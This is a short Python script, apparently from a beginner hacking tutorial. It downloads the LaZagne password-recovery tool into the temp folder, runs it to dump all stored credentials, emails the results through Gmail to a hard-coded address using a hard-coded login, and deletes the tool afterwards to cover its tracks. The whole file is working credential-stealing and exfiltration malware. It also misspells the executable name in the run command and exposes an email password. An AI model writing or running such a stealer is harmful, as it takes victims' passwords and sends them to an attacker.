import requests # this allows us to send request to internet
import subprocess, smtplib, re, os, tempfile  # we want to find temp directory in whatever is os is


def download(url):
    get_response = requests.get(url) # get function
                                   # it sends a get request for you to url and it returns the result.
    print(get_response)
    file_name = url.split("/")[-1]  # the last elemet of the list

    with open(file_name, "wb") as out_file: # we are saying that it is a binary file with 's'
         out_file.write(get_response.content)


def send_email(email, password, message):

    #  we created a smtp server here
    server = smtplib.SMTP("smtp.gmail.com", 587) # this is google server and the port number that it run
    server.starttls()
    server.login(email,password)
    server.sendmail(email, email, message)
    server.quit()


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.2/lazagne.exe")
command = "lazagna.exe all"
result = subprocess.check_output(command, shell=True)
send_email("ahmetcankaraagaclii@gmail.com", "Weare?1903", result)
os.remove("lazagne.exe")

